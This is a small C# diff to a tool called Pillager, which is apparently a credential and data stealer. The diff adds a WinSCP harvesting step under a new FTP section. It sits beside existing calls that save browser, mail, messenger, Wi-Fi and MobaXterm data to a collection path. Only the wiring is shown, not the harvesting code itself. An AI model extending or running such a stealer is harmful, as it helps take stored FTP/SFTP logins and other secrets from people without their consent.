@@ -1,5 +1,6 @@
 ﻿using System.IO;
 using Pillager.Browsers;
+using Pillager.FTP;
 using Pillager.Helper;
 using Pillager.Mails;
 using Pillager.Messengers;
@@ -26,6 +27,9 @@ namespace Pillager
 
             //Others
             Wifi.Save(savepath);
+
+            //FTP
+            WinSCP.Save(savepath);
 
             //Tools
             MobaXterm.Save(savepath);
